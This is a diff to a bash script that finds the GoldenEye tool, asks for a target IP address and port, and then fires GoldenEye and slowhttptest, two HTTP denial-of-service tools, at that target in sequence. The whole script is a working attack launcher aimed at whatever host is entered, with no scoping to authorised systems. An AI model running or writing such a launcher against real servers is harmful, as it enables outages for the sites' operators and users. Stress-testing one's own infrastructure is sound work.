@@ -7,22 +7,42 @@ check_program() {
 	fi
 }
 
+find_goldeneye() {
+	local search_paths=(
+		"$HOME/GoldenEye/goldeneye.py"
+		"/usr/local/bin/goldeneye.py"
+		"/usr/bin/goldeneye.py"
+		"/opt/GoldenEye/goldeneye.py"
+	)
+
+	for path in "${search_paths[@]}"; do
+		if [ -f "$path" ]; then
+			echo "$path"
+			return
+		fi
+	done
+
+	read -p "GoldenEye filepath not found. Please enter the full path to goldeneye.py: " custom_path
+	if [ ! -f "$custom_path" ]; then
+		echo "Its not there :("
+		exit 1
+	fi
+	echo "$custom_path"
+}
+
 check_program python
 check_program slowhttptest
 
-#I have to do this like this cause the kali package for goldeneye is broken
-if [ ! -f "GoldenEye/goldeneye.py" ]; then
-	echo "GoldenEye filepath not found. Please make sure it's installed in your home-dir /Goldeneye/goldeneye.py "
-	exit 1
-fi
+# Find the GoldenEye script (kali bricked the binary)
+goldeneye_path=$(find_goldeneye)
 
 read -p "Enter the IP address: " ip_address
 read -p "Enter the port: " port
 
-python GoldenEye/goldeneye.py http://$ip_address:$port/ -d &
+python "$goldeneye_path" http://$ip_address:$port/ -d &
 sleep 5
 pkill -f goldeneye
 
-slowhttptest -u http://$ip_address:$port/
+slowhttptest -u http://$ip_address:$port/ &
 sleep 30
 pkill slowhttptest
